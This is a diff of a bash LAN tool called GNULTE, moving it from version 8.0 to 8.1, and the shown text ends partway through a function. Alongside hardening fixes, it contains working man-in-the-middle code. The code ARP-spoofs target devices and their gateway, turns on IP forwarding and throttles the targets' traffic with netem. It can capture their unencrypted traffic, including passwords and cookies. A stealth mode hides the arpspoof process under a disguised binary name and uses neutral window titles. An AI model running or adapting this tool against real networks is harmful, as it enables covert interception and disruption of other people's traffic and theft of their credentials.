@@ -10,7 +10,7 @@
 #   ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝   ╚══════╝
 #
 #    GNU LAN Network Testing Environment
-#    Version 8.0
+#    Version 8.1
 #
 # =============================================================================
 #  DISCLAIMER – READ CAREFULLY
@@ -64,6 +64,15 @@ SPOOF_MASK_BIN="/tmp/.cache-watchdog"
 CAPTURE_FILE=""
 CAPTURE_PID=""
 DUPCHECK=false
+
+# Restored-on-exit system state (captured just before we change anything)
+ORIG_IP_FORWARD=0
+IP_FORWARD_CHANGED=false
+QDISC_BEFORE=""
+QDISCS_APPLIED=false
+STATE_DIRTY=false
+SUDO_PING_PID=""
+TMP_DIR="$(mktemp -d /tmp/gnulte.XXXXXX 2>/dev/null)" || TMP_DIR=""
 
 # Default colours (ANSI)
 COLOR_HEADER="\033[1;36m"
@@ -178,11 +187,27 @@ theme_color_lines() {
     esac
 }
 
+# Apply COLOR_* assignments produced by theme_color_lines WITHOUT eval.
+# Lines look like: COLOR_NAME="\033[1;36m"  ->  printf -v COLOR_NAME '%b' '\033[1;36m'
+apply_lines() {
+    local block="$1" line name val
+    while IFS= read -r line; do
+        case "$line" in
+            COLOR_*=*)
+                name="${line%%=*}"
+                val="${line#*=}"
+                val="${val%\"}"; val="${val#\"}"
+                printf -v "$name" '%b' "$val"
+                ;;
+        esac
+    done <<< "$block"
+}
+
 # Apply the selected theme (or "custom" if user hand-edited colors in the conf).
 apply_theme() {
     [ -z "$THEME" ] && THEME="${DEFAULT_THEME:-classic}"
     if [ "$THEME" != "custom" ]; then
-        eval "$(theme_color_lines "$THEME")"
+        apply_lines "$(theme_color_lines "$THEME")"
     fi
 }
 
@@ -196,10 +221,22 @@ THEME="${THEME:-$DEFAULT_THEME}"
 VERBOSITY="${VERBOSITY:-$DEFAULT_VERBOSITY}"
 apply_theme
 
-# Load custom profiles if exists
-if [ -f "$PROFILES_FILE" ]; then
-    source "$PROFILES_FILE"
-fi
+# Load custom profiles (plain data file, never sourced — no code execution)
+load_custom_profiles() {
+    CUSTOM_PROFILES=()
+    [ -f "$PROFILES_FILE" ] || return 0
+    local line name val
+    while IFS= read -r line; do
+        case "$line" in
+            ''|\#*) continue ;;
+        esac
+        if [[ "$line" =~ ^[A-Za-z0-9_.-]+=[0-9]+\|[0-9]+\|[0-9]+\|[0-9]+\|[0-9]+\|[0-9]+$ ]]; then
+            name="${line%%=*}"; val="${line#*=}"
+            CUSTOM_PROFILES["$name"]="$val"
+        fi
+    done < "$PROFILES_FILE"
+}
+load_custom_profiles
 
 # -----------------------------------------------------------------------------
 # HEADER
@@ -214,7 +251,7 @@ show_header() {
     echo '  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝   ╚══════╝'
     echo -e "${COLOR_RESET}"
     echo -e "  ${COLOR_INFO}${COLOR_BOLD}GNU LAN Network Testing Environment${COLOR_RESET}"
-    echo -e "  ${COLOR_DIM}Version 8.0 ${COLOR_HEADER}•${COLOR_RESET} ${COLOR_DIM}Authorised testing on networks you own${COLOR_RESET}"
+    echo -e "  ${COLOR_DIM}Version 8.1 ${COLOR_HEADER}•${COLOR_RESET} ${COLOR_DIM}Authorised testing on networks you own${COLOR_RESET}"
     echo ""
 }
 
@@ -244,8 +281,9 @@ check_sudo() {
         # Re-execute script with sudo
         sudo -v || { echo -e "${COLOR_ERR}Failed to obtain sudo. Exiting.${COLOR_RESET}"; exit 1; }
         
-        # Keep sudo alive in background
+        # Keep sudo alive in background (track it so cleanup can stop it)
         ( while true; do sudo -n true; sleep 60; kill -0 "$$" || exit; done 2>/dev/null ) &
+        SUDO_PING_PID=$!
         
         echo -e "${COLOR_OK}[OK] Sudo access granted.${COLOR_RESET}"
         echo ""
@@ -359,7 +397,7 @@ show_boot() {
         "Starting"
     )
     local -a icons=("●" "▲" "■" "◆" "★" "▶")
-    printf "\n${COLOR_INFO}${COLOR_BOLD}  GNULTE-BIOS v8.0${COLOR_RESET}\n"
+    printf "\n${COLOR_INFO}${COLOR_BOLD}  GNULTE-BIOS v8.1${COLOR_RESET}\n"
     for idx in "${!stages[@]}"; do
         printf "\r  ${COLOR_DIM}${icons[$idx]}${COLOR_RESET} ${stages[$idx]}..."
         sleep 1
@@ -444,8 +482,21 @@ save_profile() {
         log_err "Profile name required."
         return 1
     fi
+    if ! [[ "$name" =~ ^[A-Za-z0-9_.-]{1,40}$ ]]; then
+        log_err "Profile name may only contain letters, digits, '_', '.', '-' (max 40 chars)."
+        return 1
+    fi
 
-    echo "CUSTOM_PROFILES[$name]=\"$LATENCY|$JITTER|$LOSS|$DUPLICATE|$REORDER|$BANDWIDTH\"" >> "$PROFILES_FILE"
+    local val="$LATENCY|$JITTER|$LOSS|$DUPLICATE|$REORDER|$BANDWIDTH"
+    touch "$PROFILES_FILE" 2>/dev/null || { log_err "Cannot write $PROFILES_FILE"; return 1; }
+
+    # Update in place instead of appending duplicates
+    if grep -qx "^${name}=" "$PROFILES_FILE" 2>/dev/null; then
+        sed -i "s|^${name}=.*|${name}=${val}|" "$PROFILES_FILE"
+    else
+        echo "${name}=${val}" >> "$PROFILES_FILE"
+    fi
+    CUSTOM_PROFILES["$name"]="$val"
     log_ok "Saved profile: $name"
 }
 
@@ -458,7 +509,7 @@ show_profiles() {
     done
 
     if [ -f "$PROFILES_FILE" ]; then
-        local custom=$(grep -oP 'CUSTOM_PROFILES\[\K[^\]]+' "$PROFILES_FILE" 2>/dev/null)
+        local custom=$(grep -oP '^[A-Za-z0-9_.-]+(?==)' "$PROFILES_FILE" 2>/dev/null)
         if [ -n "$custom" ]; then
             echo "  ──────────────────────────────────────────────────────────────────────"
             echo -e "  ${COLOR_DIM}Custom profiles:${COLOR_RESET}"
@@ -476,6 +527,30 @@ show_profiles() {
 # -----------------------------------------------------------------------------
 # FUNCTIONS
 # -----------------------------------------------------------------------------
+valid_ip4() {
+    local ip="$1" oct et
+    [[ "$ip" =~ ^[0-9.]+$ ]] || return 1
+    IFS=. read -ra oct <<< "$ip"
+    [ "${#oct[@]}" -eq 4 ] || return 1
+    for et in "${oct[@]}"; do
+        [[ "$et" =~ ^[0-9]{1,3}$ ]] && [ "$et" -le 255 ] || return 1
+    done
+    return 0
+}
+
+valid_mac() {
+    [[ "$1" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]
+}
+
+cleanup_tmp() {
+    [ -n "$TMP_DIR" ] && rm -rf "$TMP_DIR" 2>/dev/null
+}
+# Whatever happens (normal stop, error, crash), restore system state + temp files.
+exit_handler() {
+    cleanup_tmp
+    cleanup
+}
+trap 'exit_handler' EXIT
 log_info() {
     [ "$LOG_MODE" = "quiet" ] && return
     echo -e "${COLOR_INFO}[INFO]${COLOR_RESET} $1"
@@ -552,7 +627,7 @@ log_section() {
 
 show_help() {
     cat << EOF
-${COLOR_HEADER}GNULTE${COLOR_RESET} – ${COLOR_DIM}GNU LAN Network Testing Environment v8.0${COLOR_RESET}
+${COLOR_HEADER}GNULTE${COLOR_RESET} – ${COLOR_DIM}GNU LAN Network Testing Environment v8.1${COLOR_RESET}
 
 ${COLOR_BOLD}TARGETING:${COLOR_RESET}
   -t, --target IP       Target IP (or multiple: IP1,IP2,IP3)
@@ -577,6 +652,7 @@ ${COLOR_BOLD}ADVANCED:${COLOR_RESET}
   --scan                Deep scan (ports, OS, hostname)
   --quick               Quick scan (ARP only, faster)
   --capture FILE        Capture the target's traffic with tcpdump to FILE (.pcap)
+                        NOTE: contains whatever the target sends UNENCRYPTED — treat it like a secret
   --dupcheck            Detect duplicate IPs / ARP conflicts on the LAN
   --stealth             Disguised arpspoof binary, generic window titles, no branding on screen
   --force               Skip interactive confirmations (requires explicit flags)
@@ -597,6 +673,15 @@ ${COLOR_BOLD}AUTOMATIC:${COLOR_RESET}
   Validation            Parameter sanity checks before any traffic is shaped
   Post-test report      Generates gnulte-report-<ts>/ (report.txt + report.html
                         with graphs) into the current directory on exit
+
+${COLOR_BOLD}NOTES:${COLOR_RESET}
+  IPv4 only              This version targets IPv4 hosts; IPv6 is neither
+                        shaped nor spoofed.
+  Shaping scope          Traffic control is applied per-target via tc filters —
+                        other devices on the interface are NOT affected.
+  Recovery               On exit GNULTE restores IP forwarding, the prior root
+                        qdisc, kills only its own arpspoof instances, and sends
+                        a gateway ARP so target ARP caches re-converge quickly.
 
 EOF
 }
@@ -745,7 +830,7 @@ identify_device() {
 
     if [ "$QUICK_SCAN" = false ]; then
         for p in 22 80 443 445 554 5555 8008 8080 8443 9000 32400; do
-            timeout 1 bash -c "echo >/dev/tcp/$ip/$p" 2>/dev/null && ports="${ports}${p},"
+            timeout 1 bash -c 'exec 3<>"/dev/tcp/$1/$2"' _ "$ip" "$p" 2>/dev/null && ports="${ports}${p},"
         done
         ports=$(echo "$ports" | sed 's/,$//')
     fi
@@ -784,9 +869,7 @@ identify_device() {
 # -----------------------------------------------------------------------------
 deep_scan() {
     local ip=$1
-    local os_result="Unknown"
-    local ports_result="None"
-    local hostname_result="Unknown"
+    local out ports_r os_result ports_result hostname_result
     log_info "Deep scanning $ip..."
 
     if ! command -v nmap &>/dev/null; then
@@ -795,14 +878,17 @@ deep_scan() {
         return
     fi
 
-    os_result=$(nmap -O -T4 "$ip" 2>/dev/null | grep "OS details" | cut -d: -f2 | head -1 | sed 's/^ //')
-    [ -z "$os_result" ] && os_result="Unknown"
+    # Single structured (grepable -oG) run: OS fingerprint + open ports together.
+    out=$(timeout 90 nmap -O -T4 -p 22,23,25,53,80,110,135,139,143,443,445,554,993,995,1433,3306,3389,5432,5555,5900,6379,8008,8080,8443,9000,32400 --open -oG - "$ip" 2>/dev/null)
 
-    ports_result=$(nmap -p 22,23,25,53,80,110,135,139,143,443,445,554,993,995,1433,3306,3389,5432,5555,5900,6379,8008,8080,8443,9000,32400 --open -T4 "$ip" 2>/dev/null | grep "open" | awk '{print $1}' | tr '\n' ',' | sed 's/,$//')
+    ports_result=$(grep -oP '\b[0-9]+(?=/open/tcp/)' <<< "$out" | sort -un | tr '\n' ',' | sed 's/,$//')
     [ -z "$ports_result" ] && ports_result="None"
 
-    hostname_result=$(host "$ip" 2>/dev/null | head -1 | awk '{print $5}' | cut -d. -f1)
-    [ -z "$hostname_result" ] && hostname_result="Unknown"
+    os_result=$(awk -F'OS: ' 'NF>1{print $2}' <<< "$out" | head -1 | cut -d'|' -f1 | sed -E 's/[[:space:]]*Seq:.*//')
+    [ -z "$os_result" ] && os_result="Unknown"
+
+    hostname_result=$(resolve_device_name "$ip")
+    [ "$hostname_result" = "Unknown" ] && hostname_result="$ip"
 
     echo ""
     echo "  ${COLOR_BOLD}IP:${COLOR_RESET}        $ip"
@@ -873,13 +959,13 @@ pick_theme() {
             [ "$t" = "$CHOSEN_THEME" ] && marker="*"
             saved_colors=$(theme_color_lines "$t")
             # side-by-side: name then preview using that theme's colours
-            eval "$saved_colors"
+            apply_lines "$saved_colors"
             printf "  %s %d) %-12s " "$marker" "$i" "$t"
             preview_sample "${COLOR_HEADER}"
             i=$((i+1))
         done
         # restore currently selected theme's colours for the rest of the app
-        eval "$(theme_color_lines "$CHOSEN_THEME")"
+        apply_lines "$(theme_color_lines "$CHOSEN_THEME")"
         echo ""
         echo -e "  ${COLOR_DIM}custom = keep the colors hand-edited in ~/.gnulte.conf${COLOR_RESET}"
         read -p "  Select theme [1-7] ($CHOSEN_THEME): " tt
@@ -1052,13 +1138,13 @@ scan_devices() {
         echo ""
     fi
 
-    ( sudo arp-scan --local > /tmp/gnulte_arp.txt 2>/dev/null ) &
+    ( sudo arp-scan --local > "$TMP_DIR/arp.txt" 2>/dev/null ) &
     local scan_pid=$!
     spinner "$scan_pid" "Running ARP scan..."
     wait "$scan_pid"
 
-    ARP_OUTPUT=$(cat /tmp/gnulte_arp.txt)
-    rm -f /tmp/gnulte_arp.txt
+    ARP_OUTPUT=$(cat "$TMP_DIR/arp.txt")
+    rm -f "$TMP_DIR/arp.txt"
 
     if [ -z "$ARP_OUTPUT" ]; then
         log_err "arp-scan returned no output. Check permissions."
@@ -1083,6 +1169,8 @@ scan_devices() {
 
         IP=$(echo "$line" | awk '{print $1}')
         MAC=$(echo "$line" | awk '{print $2}')
+        valid_ip4 "$IP" || continue
+        valid_mac "$MAC" || continue
         VENDOR=$(echo "$line" | cut -d' ' -f3-)
         if [[ "$IP" != "$MY_IP" ]]; then
             IP_LIST+=("$IP")
@@ -1474,6 +1562,23 @@ masked_spoof() {
     echo $!
 }
 
+# Kill only a spoof instance we started (the sudo PID we recorded + its child).
+kill_own_spoof() {
+    local p="$1"
+    [[ "$p" =~ ^[0-9]+$ ]] || return 0
+    sudo kill "$p" 2>/dev/null
+    sleep 0.2
+    # arpspoof is the only child of the sudo wrapper we spawned — kill it by PPID,
+    # which never touches other users' (or other interface/target) instances.
+    sudo pkill -P "$p" 2>/dev/null
+    sudo kill -- "-$p" 2>/dev/null
+}
+
+alive_spoof() {
+    local p="$1"
+    sudo kill -0 "$p" 2>/dev/null
+}
+
 # Generic window title (neutral in stealth mode)
 mon_title() {
     if [ "$STEALTH" = true ]; then
@@ -1489,31 +1594,53 @@ mon_title() {
 execute() {
     log_section "EXECUTING"
 
-    if ! expert_confirm "Enable IP forwarding (route the target's traffic through this computer)" \
+    # -- Step 1: IP forwarding (only if the operator actually confirms) --
+    ORIG_IP_FORWARD=$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo 0)
+    if expert_confirm "Enable IP forwarding (route the target's traffic through this computer)" \
         "sudo sysctl -w net.ipv4.ip_forward=1"; then
-        log_warn "Skipped by user."
+        say "Step 1 — turning on routing so the chosen device's data flows through this computer…"
+        log_cmd "sysctl -w net.ipv4.ip_forward=1"
+        if sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1; then
+            log_ok "IP forwarding enabled"
+            if [ "$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo 0)" = "1" ]; then
+                IP_FORWARD_CHANGED=true; STATE_DIRTY=true
+            fi
+        else
+            log_err "Could not enable IP forwarding."
+            exit 1
+        fi
+    else
+        log_warn "Skipped IP forwarding by user."
     fi
-    say "Step 1 — turning on routing so the chosen device's data flows through this computer…"
-    log_cmd "sysctl -w net.ipv4.ip_forward=1"
-    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
-    log_ok "IP forwarding enabled"
 
+    # -- Step 1b: optional packet capture (with overwrite guard + warning) --
     if [ -n "$CAPTURE_FILE" ]; then
-        local cexpr capi
-        cexpr=""
-        for capi in "${!TARGETS[@]}"; do
-            cexpr="$cexpr host ${TARGETS[$capi]} or "
+        if [ "$CAPTURE_FILE" != "-" ] && [ -e "$CAPTURE_FILE" ]; then
+            read -p "Capture file $CAPTURE_FILE already exists. Overwrite? (y/n) [n]: " OW
+            case "${OW:-n}" in
+                y|Y) : ;;
+                *)   log_warn "Capture disabled (existing file kept)."; CAPTURE_FILE="" ;;
+            esac
+        fi
+    fi
+    if [ -n "$CAPTURE_FILE" ]; then
+        log_warn "Sensitive-data notice: the capture stores EVERYTHING the selected device sends"
+        log_warn "unencrypted (passwords, cookies, media). Protect $CAPTURE_FILE like a secret."
+        local -a CAP_EXPR=()
+        local capi
+        for capi in "${TARGETS[@]}"; do
+            CAP_EXPR+=(host "$capi")
         done
-        cexpr="${cexpr% or }"
-        log_cmd "tcpdump -i $INTERFACE $cexpr -w $CAPTURE_FILE"
+        log_cmd "tcpdump -i $INTERFACE ${CAP_EXPR[*]} -w $CAPTURE_FILE"
         say "Recording each target's traffic to $CAPTURE_FILE while the test runs…"
-        ( sudo tcpdump -i "$INTERFACE" $cexpr -w "$CAPTURE_FILE" >/dev/null 2>&1 ) &
+        ( sudo tcpdump -i "$INTERFACE" "${CAP_EXPR[@]}" -w "$CAPTURE_FILE" >/dev/null 2>&1 ) &
         CAPTURE_PID=$!
         sleep 1
         if [ "$CAPTURE_FILE" != "-" ] && ! sudo kill -0 "$CAPTURE_PID" 2>/dev/null; then
             log_err "tcpdump failed to start (wrong interface or permission). Capture disabled."
             CAPTURE_PID=""
         else
+            STATE_DIRTY=true
             log_ok "Capturing target traffic -> $CAPTURE_FILE"
         fi
     fi
@@ -1523,93 +1650,142 @@ execute() {
         exit 1
     fi
 
+    # -- Step 2: ARP spoofing (whole loop gated on the confirmation) --
     say "Step 2 — making each target device believe this computer is its router…"
-    if ! expert_confirm "Start ARP spoofing (redirect each target's traffic to this computer)" \
+    if expert_confirm "Start ARP spoofing (redirect each target's traffic to this computer)" \
         "sudo arpspoof -i $INTERFACE -t <TARGET> $GATEWAY"; then
-        log_warn "Skipped spoofing by user."
+        local TARGET_IP
+        for TARGET_IP in "${TARGETS[@]}"; do
+            say "Redirecting $TARGET_IP's connection through this computer…"
+            log_info "Starting attack on $TARGET_IP..."
+
+            log_cmd "arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY"
+            SPOOF1_PIDS+=("$(masked_spoof "$INTERFACE" "$TARGET_IP" "$GATEWAY")")
+            sleep 1
+            if ! alive_spoof "${SPOOF1_PIDS[-1]}"; then
+                log_err "arpspoof failed to start for $TARGET_IP (check interface/route + root)."
+                exit 1
+            fi
+            STATE_DIRTY=true
+            log_ok "Spoof $TARGET_IP -> $GATEWAY (PID ${SPOOF1_PIDS[-1]})"
+
+            log_cmd "arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP"
+            SPOOF2_PIDS+=("$(masked_spoof "$INTERFACE" "$GATEWAY" "$TARGET_IP")")
+            sleep 1
+            if ! alive_spoof "${SPOOF2_PIDS[-1]}"; then
+                log_err "arpspoof failed to start for $GATEWAY side (check interface/route + root)."
+                exit 1
+            fi
+            STATE_DIRTY=true
+            log_ok "Spoof $GATEWAY -> $TARGET_IP (PID ${SPOOF2_PIDS[-1]})"
+        done
+        echo ""
+        animated_bar 2 "Waiting for ARP tables to update..."
+    else
+        log_warn "Skipped spoofing by user — shaping will only affect direct traffic to/from targets."
     fi
-for TARGET_IP in "${TARGETS[@]}"; do
-        say "Redirecting $TARGET_IP's connection through this computer…"
-        log_info "Starting attack on $TARGET_IP..."
 
-        log_cmd "arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY"
-        SPOOF1_PIDS+=("$(masked_spoof "$INTERFACE" "$TARGET_IP" "$GATEWAY")")
-        sleep 1
-        if ! sudo kill -0 "${SPOOF1_PIDS[-1]}" 2>/dev/null; then
-            log_err "arpspoof failed to start for $TARGET_IP (check interface/route + root)."
-            cleanup; exit 1
-        fi
-        log_ok "Spoof $TARGET_IP -> $GATEWAY (PID ${SPOOF1_PIDS[-1]})"
-
-        log_cmd "arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP"
-        SPOOF2_PIDS+=("$(masked_spoof "$INTERFACE" "$GATEWAY" "$TARGET_IP")")
-        sleep 1
-        if ! sudo kill -0 "${SPOOF2_PIDS[-1]}" 2>/dev/null; then
-            log_err "arpspoof failed to start for $GATEWAY side (check interface/route + root)."
-            cleanup; exit 1
-        fi
-        log_ok "Spoof $GATEWAY -> $TARGET_IP (PID ${SPOOF2_PIDS[-1]})"
-    done
-    echo ""
-    animated_bar 2 "Waiting for ARP tables to update..."
-
-    log_info "Applying traffic control..."
-    sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null
-
-    # Build the netem parameters
-    NETEM="delay ${LATENCY}ms ${JITTER}ms"
-    [ "$LOSS" -gt 0 ] && NETEM="$NETEM loss ${LOSS}%"
-    [ "$DUPLICATE" -gt 0 ] && NETEM="$NETEM duplicate ${DUPLICATE}%"
-    [ "$REORDER" -gt 0 ] && NETEM="$NETEM reorder ${REORDER}% gap 5"
+    # -- Step 3: target-specific traffic shaping (bypass class for everyone else) --
+    local -a NETEM_ARGS=()
+    NETEM_ARGS=(delay "${LATENCY}ms" "${JITTER}ms")
+    [ "$LOSS" -gt 0 ] && NETEM_ARGS+=(loss "${LOSS}%")
+    [ "$DUPLICATE" -gt 0 ] && NETEM_ARGS+=(duplicate "${DUPLICATE}%")
+    [ "$REORDER" -gt 0 ] && NETEM_ARGS+=(reorder "${REORDER}%" gap 5)
 
     say "Step 3 — slowing the target's link to: ${LATENCY}ms delay${LOSS:+ / ${LOSS}% loss}${JITTER:+ (jitter ${JITTER}ms)}${BANDWIDTH:+ / ${BANDWIDTH} kbps cap}…"
-    if ! expert_confirm "Apply traffic shaping to ${TARGETS[*]}" \
-        "sudo tc qdisc add dev $INTERFACE root netem ${NETEM:-delay ${LATENCY}ms ${JITTER}ms}"; then
+    if expert_confirm "Apply traffic shaping to ${TARGETS[*]}" \
+        "sudo tc qdisc add dev $INTERFACE root handle 1: htb default 999"; then
+        # Snapshot the interface's current root qdisc so it can be restored later.
+        QDISC_BEFORE=$(tc qdisc show dev "$INTERFACE" 2>/dev/null | head -1)
+        if ! apply_tc_chain; then
+            log_err "Failed to apply traffic control"
+            exit 1
+        fi
+        QDISCS_APPLIED=true; STATE_DIRTY=true
+    else
         log_warn "Skipped traffic control by user."
     fi
-
-    # Bandwidth throttling (if enabled) – chain netem UNDER htb so nothing is lost
-    if [ "$BANDWIDTH" -gt 0 ]; then
-        log_info "Chaining netem under htb (${BANDWIDTH} kbps)..."
-        log_cmd "tc qdisc add dev $INTERFACE root handle 1: htb default 10"
-        log_cmd "tc class add dev $INTERFACE parent 1: classid 1:10 htb rate ${BANDWIDTH}kbit"
-        log_cmd "tc qdisc add dev $INTERFACE parent 1:10 handle 10: netem $NETEM"
-        log_cmd "tc qdisc add dev $INTERFACE parent 10: handle 30: tbf rate ${BANDWIDTH}kbit burst 32kbit latency 400ms"
-
-        ( sudo tc qdisc add dev "$INTERFACE" root handle 1: htb default 10 \
-              && sudo tc class add dev "$INTERFACE" parent 1: classid 1:10 htb rate "${BANDWIDTH}kbit" \
-              && sudo tc qdisc add dev "$INTERFACE" parent 1:10 handle 10: netem $NETEM \
-              && sudo tc qdisc add dev "$INTERFACE" parent 10: handle 30: tbf rate "${BANDWIDTH}kbit" burst 32kbit latency 400ms 2>/dev/null ) &
-        local tc_pid=$!
-        spinner "$tc_pid" "Applying traffic shaping (netem + bandwidth)..."
-        wait "$tc_pid"
-        if [ $? -eq 0 ]; then
-            log_ok "Traffic shaped: ${BANDWIDTH} kbps with netem"
-        else
-            log_err "Failed to apply traffic control"
-            cleanup
-            exit 1
-        fi
-    else
-        log_cmd "tc qdisc add dev $INTERFACE root netem $NETEM"
-        ( sudo tc qdisc add dev "$INTERFACE" root netem $NETEM 2>/dev/null ) &
-        local tc_pid=$!
-        spinner "$tc_pid" "Applying traffic control..."
-        wait "$tc_pid"
-        if [ $? -eq 0 ]; then
-            log_ok "Traffic control applied to ALL targets"
-        else
-            log_err "Failed to apply traffic control"
-            cleanup
-            exit 1
-        fi
-    fi
     echo ""
+}
+
+# Build the per-target shaping tree:
+#   root htb (default bypass class for non-target traffic) + u32 filters that
+#   send ONLY the target's src/dst traffic into a netem leaf.
+# This leaves everyone else on the interface completely untouched.
+apply_tc_chain() {
+    local rate="${BANDWIDTH}kbit"
+    [ "$BANDWIDTH" -eq 0 ] && rate="1gbit"
+
+    log_info "Applying per-target traffic control (non-target traffic bypasses)..."
+    log_cmd "tc qdisc add dev $INTERFACE root handle 1: htb default 999"
+    log_cmd "tc class add dev $INTERFACE parent 1: classid 1:999 htb rate 1gbit ceil 1gbit"
+    log_cmd "tc class add dev $INTERFACE parent 1: classid 1:10 htb rate ${rate} ceil ${rate}"
+    log_cmd "tc qdisc add dev $INTERFACE parent 1:10 handle 10: netem ${NETEM_ARGS[*]}"
+    log_cmd "tc filter add dev $INTERFACE parent 1: protocol ip prio 1 u32 match ip dst <TARGET>/32 flowid 1:10 (and ip src)"
+
+    sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null
+    sudo tc qdisc add dev "$INTERFACE" root handle 1: htb default 999 2>/dev/null || return 1
+    sudo tc class add dev "$INTERFACE" parent 1: classid 1:999 htb rate 1gbit ceil 1gbit 2>/dev/null || return 1
+    sudo tc class add dev "$INTERFACE" parent 1: classid 1:10 htb rate "$rate" ceil "$rate" 2>/dev/null || return 1
+    sudo tc qdisc add dev "$INTERFACE" parent 1:10 handle 10: netem "${NETEM_ARGS[@]}" 2>/dev/null || return 1
+
+    local TP
+    for TP in "${TARGETS[@]}"; do
+        sudo tc filter add dev "$INTERFACE" parent 1: protocol ip prio 1 \
+            u32 match ip dst "$TP"/32 flowid 1:10 2>/dev/null || return 1
+        sudo tc filter add dev "$INTERFACE" parent 1: protocol ip prio 1 \
+            u32 match ip src "$TP"/32 flowid 1:10 2>/dev/null || return 1
+    done
+    return 0
 }
 
 # -----------------------------------------------------------------------------
 # MULTI-TERMINAL MONITOR (spawns a terminal per target)
 # -----------------------------------------------------------------------------
+# Static body reused for every monitor window; values flow in via environment,
+# so nothing user-supplied is ever interpolated into the spawned shell.
+monitor_script() {
+    if [ "$STEALTH" = true ]; then
+        cat <<'SCRIPT'
+IP="${IP:?}"
+echo "Target: $IP"
+echo "Latency: ${LAT}ms | Jitter: ${JIT}ms | Loss: ${LOSS}%"
+echo "────────────────────────────────────────"
+while true; do
+    P=$(ping -c 1 -W 1 "$IP" 2>/dev/null | grep 'time=' | awk -F'time=' '{print $2}' | cut -d' ' -f1)
+    if [ -n "$P" ]; then
+        MS=$(printf '%.0f' "$P")
+        echo "[$(date +%H:%M:%S)] ${MS}ms"
+    else
+        echo "[$(date +%H:%M:%S)] unreachable"
+    fi
+    sleep 1
+done
+SCRIPT
+    else
+        cat <<'SCRIPT'
+IP="${IP:?}"
+echo "GNULTE Monitor – Target: $IP"
+echo "Latency: ${LAT}ms | Jitter: ${JIT}ms | Loss: ${LOSS}%"
+[ "${BW:-0}" -gt 0 ] && echo "Bandwidth: ${BW} kbps"
+echo "────────────────────────────────────────"
+while true; do
+    P=$(ping -c 1 -W 1 "$IP" 2>/dev/null | grep 'time=' | awk -F'time=' '{print $2}' | cut -d' ' -f1)
+    if [ -n "$P" ]; then
+        MS=$(printf '%.0f' "$P")
+        echo "[$(date +%H:%M:%S)] ${MS}ms"
+    else
+        echo "[$(date +%H:%M:%S)] unreachable"
+    fi
+    sleep 1
+done
+SCRIPT
+    fi
+}
+
+# Single-quote a string so it can be safely embedded inside another shell -c.
+sq() { printf "%s" "${1//\'/\'\\\'\'}"; }
+
 spawn_monitor_terminal() {
     local ip="$1"
     local lat="$2"
@@ -1618,35 +1794,39 @@ spawn_monitor_terminal() {
     local bw="$5"
     local title; title="$(mon_title "$ip")"
 
-    local cmd
-    if [ "$STEALTH" = true ]; then
-        cmd="echo 'Target: $ip'; echo 'Latency: ${lat}ms | Jitter: ${jit}ms | Loss: ${loss}%'; echo '────────────────────────────────────────'; while true; do P=\$(ping -c 1 -W 1 $ip 2>/dev/null | grep 'time=' | awk -F'time=' '{print \$2}' | cut -d' ' -f1); if [ -n \"\$P\" ]; then MS=\$(printf '%.0f' \"\$P\"); echo \"[\$(date +%H:%M:%S)] \${MS}ms\"; else echo \"[\$(date +%H:%M:%S)] unreachable\"; fi; sleep 1; done"
-    else
-        cmd="echo 'GNULTE Monitor – Target: $ip'; echo 'Latency: ${lat}ms | Jitter: ${jit}ms | Loss: ${loss}%'; [ $bw -gt 0 ] && echo 'Bandwidth: ${bw} kbps'; echo '────────────────────────────────────────'; while true; do P=\$(ping -c 1 -W 1 $ip 2>/dev/null | grep 'time=' | awk -F'time=' '{print \$2}' | cut -d' ' -f1); if [ -n \"\$P\" ]; then MS=\$(printf '%.0f' \"\$P\"); echo \"[\$(date +%H:%M:%S)] \${MS}ms\"; else echo \"[\$(date +%H:%M:%S)] unreachable\"; fi; sleep 1; done"
-    fi
+    local script; script="$(monitor_script)"
+    local envcmd="IP=${ip} LAT=${lat} JIT=${jit} LOSS=${loss} BW=${bw} bash -c '$(sq "$script")'"
 
     # Try different terminals
     if command -v gnome-terminal &>/dev/null; then
-        gnome-terminal --title="$title" -- bash -c "$cmd" &
+        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
+            gnome-terminal --title="$title" -- bash -c "$script" &
         TERMINAL_PIDS+=($!)
     elif command -v konsole &>/dev/null; then
-        konsole --title "$title" -e bash -c "$cmd" &
+        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
+            konsole --title "$title" -e bash -c "$script" &
         TERMINAL_PIDS+=($!)
     elif command -v xterm &>/dev/null; then
-        xterm -title "$title" -e bash -c "$cmd" &
+        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
+            xterm -title "$title" -e bash -c "$script" &
         TERMINAL_PIDS+=($!)
     elif command -v xfce4-terminal &>/dev/null; then
-        xfce4-terminal --title="$title" -e "bash -c \"$cmd\"" &
+        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
+            xfce4-terminal --title="$title" -e "bash -c \"$script\"" &
         TERMINAL_PIDS+=($!)
     elif command -v alacritty &>/dev/null; then
-        alacritty --title "$title" -e bash -c "$cmd" &
+        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
+            alacritty --title "$title" -e bash -c "$script" &
         TERMINAL_PIDS+=($!)
     elif command -v kitty &>/dev/null; then
-        kitty --title "$title" bash -c "$cmd" &
+        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
+            kitty --title "$title" bash -c "$script" &
         TERMINAL_PIDS+=($!)
     else
         if command -v tmux &>/dev/null; then
-            tmux new-window -n "$title" "bash -c \"$cmd\""
+            tmux setenv IP "$ip" \; setenv LAT "$lat" \; setenv JIT "$jit" \; \
+                setenv LOSS "$loss" \; setenv BW "$bw" \; \
+                new-window -n "$title" "$envcmd"
